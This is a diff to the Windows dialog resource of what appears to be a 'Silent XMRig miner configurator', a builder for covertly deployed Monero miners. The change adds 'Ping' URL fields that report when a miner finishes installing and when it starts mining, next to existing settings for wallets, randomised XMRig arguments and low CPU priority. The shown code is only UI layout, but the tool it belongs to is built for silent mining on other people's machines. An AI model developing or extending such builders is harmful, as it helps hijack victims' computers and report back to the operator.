@@ -50,15 +50,15 @@ END
 // Dialog
 //
 
-IDD_DIALOG1 DIALOGEX 0, 0, 415, 391
+IDD_DIALOG1 DIALOGEX 0, 0, 415, 420
 STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
 CAPTION "Silent XMRig miner configurator"
 FONT 8, "MS Shell Dlg", 400, 0, 0x1
 BEGIN
-    DEFPUSHBUTTON   "Generate",IDOK,293,370,50,14
-    PUSHBUTTON      "Cancel",IDCANCEL,358,370,50,14
+    DEFPUSHBUTTON   "Generate",IDOK,293,399,50,14
+    PUSHBUTTON      "Cancel",IDCANCEL,358,399,50,14
     EDITTEXT        IDC_EDIT1,8,17,400,15,ES_AUTOHSCROLL
-    GROUPBOX        "Wallets addresses",IDC_STATIC,7,7,401,255
+    GROUPBOX        "Wallets addresses",IDC_STATIC,7,35,401,255
     EDITTEXT        IDC_EDIT2,8,35,400,15,ES_AUTOHSCROLL
     EDITTEXT        IDC_EDIT3,8,53,400,15,ES_AUTOHSCROLL
     EDITTEXT        IDC_EDIT4,8,71,400,15,ES_AUTOHSCROLL
@@ -99,17 +99,21 @@ BEGIN
     EDITTEXT        IDC_EDIT28,159,230,64,14,ES_AUTOHSCROLL | ES_NUMBER
     GROUPBOX        "Additional XMRig arguments",IDC_STATIC,237,181,171,68
     EDITTEXT        IDC_EDIT29,240,230,168,14,ES_AUTOHSCROLL
-    GROUPBOX        "Custom arguments config (Everything above will be ignored) one of 3 arguments will be selected randomly at XMRig start",IDC_STATIC,7,250,401,65
-    EDITTEXT        IDC_EDIT30,7,262,401,14,ES_AUTOHSCROLL
-    EDITTEXT        IDC_EDIT31,7,279,401,14,ES_AUTOHSCROLL
-    GROUPBOX        "Arguments test",IDC_STATIC,7,315,401,25
-    EDITTEXT        IDC_EDIT32,7,296,401,14,ES_AUTOHSCROLL
-    PUSHBUTTON      "Test",IDC_BUTTON1,7,370,61,14
-    EDITTEXT        IDC_EDIT33,7,324,401,45,ES_MULTILINE | WS_VSCROLL
+    GROUPBOX        "Custom arguments config (Everything above will be ignored) one of 3 arguments will be selected randomly at XMRig start",IDC_STATIC,7,278,401,65
+    EDITTEXT        IDC_EDIT30,7,290,401,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT31,7,307,401,14,ES_AUTOHSCROLL
+    GROUPBOX        "Arguments test",IDC_STATIC,7,343,401,25
+    EDITTEXT        IDC_EDIT32,7,324,401,14,ES_AUTOHSCROLL
+    PUSHBUTTON      "Test",IDC_BUTTON1,7,399,61,14
+    EDITTEXT        IDC_EDIT33,7,352,401,45,ES_MULTILINE | WS_VSCROLL
     LTEXT           "Here you configure the coin to mine, use tls or other things that will be added to XMRig arguments.\nAs example it is configured to mine Monero with tls, keepalive, worker name and low CPU priority",IDC_STATIC,240,191,166,33
     GROUPBOX        "L3 cache/thread(KB)",IDC_STATIC,153,219,77,30
     EDITTEXT        IDC_EDIT26,10,230,100,14,ES_AUTOHSCROLL | ES_NUMBER
-    PUSHBUTTON      "Load",IDC_BUTTON2,228,370,50,14
+    PUSHBUTTON      "Load",IDC_BUTTON2,228,399,50,14
+    GROUPBOX        "Miner install finished 'Ping' URL",IDC_STATIC,7,248,201,29
+    GROUPBOX        "Miner starts mining 'Ping' URL",IDC_STATIC,207,248,201,29
+    EDITTEXT        IDC_EDIT34,12,259,190,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT35,212,259,190,14,ES_AUTOHSCROLL
 END
 
 
@@ -126,7 +130,7 @@ BEGIN
         LEFTMARGIN, 7
         RIGHTMARGIN, 408
         TOPMARGIN, 7
-        BOTTOMMARGIN, 384
+        BOTTOMMARGIN, 413
     END
 END
 #endif    // APSTUDIO_INVOKED
